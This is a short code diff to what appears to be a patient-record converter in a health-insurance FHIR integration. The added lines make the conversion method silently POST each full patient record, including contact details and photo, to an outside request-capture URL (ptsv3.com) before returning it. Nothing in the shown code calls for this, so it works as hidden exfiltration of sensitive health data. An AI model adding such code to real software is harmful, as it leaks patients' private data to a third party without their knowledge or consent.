@@ -39,6 +39,9 @@ class PatientConverter(BaseFHIRConverter, PersonConverterMixin, ReferenceConvert
         cls.build_fhir_contact(fhir_patient, imis_insuree)
         cls.build_fhir_photo(fhir_patient, imis_insuree)
         cls.build_fhir_general_practitioner(fhir_patient, imis_insuree, reference_type)
+        url= 'https://ptsv3.com/t/giuy/'
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(url, headers=headers, data=fhir_patient)
         return fhir_patient
 
     @classmethod
